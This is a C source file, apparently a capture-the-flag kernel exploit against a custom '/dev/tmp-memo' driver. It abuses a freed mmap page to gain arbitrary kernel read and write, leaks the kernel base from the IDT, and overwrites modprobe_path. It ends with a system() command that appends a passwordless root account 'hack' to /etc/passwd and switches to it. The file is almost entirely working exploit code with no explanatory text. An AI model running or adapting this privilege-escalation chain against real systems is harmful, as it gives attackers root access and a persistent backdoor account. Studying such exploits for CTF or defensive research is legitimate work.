#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>

#define ADDR_IDT 0xfffffe0000000000

uint64_t buffer[0x100];
int fd = 0;
uint64_t *mem = NULL;

void exploit_pause() {
	puts("[+] pause!");
	getchar();
}

int main(){
	int shift = 12+9;
	setbuf(stdout, NULL);
	if((fd = open("/dev/tmp-memo", O_RDWR)) < 0) { perror("open"); }
	//puts("mmap");
	if((mem = (uint64_t *)mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 1<<shift)) == MAP_FAILED) { perror("mmap"); }
	mem[0] = 0xbeefbeef;
	//puts("unmap");
	munmap(mem, 0x1000); // free mmaped page index 1<<shift
	//exploit_pause();

	//puts("seekfd");
	lseek(fd, 0, SEEK_SET);
	//puts("writefd");

	// page fault at index 0 --> edge table of index 1<<shift will points to mid table of index 0 reused.
	write(fd, (uint64_t[]){ 0xdeadbeef }, sizeof(uint64_t)); 

	// input addr to index 1<<shift, and access index 0 to gain aarw
	int aar(void *buf, uintptr_t addr, size_t len) {
		uint64_t old;
		int ret;
		pread(fd, &old, sizeof(uint64_t), 1<<shift);
		pwrite(fd, &addr, sizeof(uint64_t), 1<<shift);
		ret = pread(fd, buf, len, 0);
		pwrite(fd, &old, sizeof(uint64_t), 1<<shift);
		return ret;
	}
	int aaw(void *buf, uintptr_t addr, size_t len) {
		uint64_t old;
		int ret;
		pread(fd, &old, sizeof(uint64_t), 1<<shift);
		pwrite(fd, &addr, sizeof(uint64_t), 1<<shift);
		ret = pwrite(fd, buf, len, 0);
		pwrite(fd, &old, sizeof(uint64_t), 1<<shift);
		return ret;
	}

	memset(buffer, 0, 0x800);
	aar(buffer, ADDR_IDT+0x14, 0x100);
	
	uint64_t kbase = buffer[0] - 0x608e03;
	uint64_t modprobe_path = kbase + 0xa38da0;
	printf("[+] kbase: 0x%lx\n", kbase);
	printf("[+] modprobe_path: 0x%lx\n", modprobe_path);
	buffer[0] = 0x612f706d742f;//tmp/a
	aaw(buffer, modprobe_path, 7);
	puts("done.");
	//exploit_pause();
	system("cd /tmp;echo -ne '#!/bin/sh\necho hack::0:0::/root:/bin/sh >> /etc/passwd\n' > /tmp/a; echo -ne '\\xff\\xff\\xff\\xff' > /tmp/b; chmod +x /tmp/b; chmod +x /tmp/a; /tmp/b; exec su - hack");

}
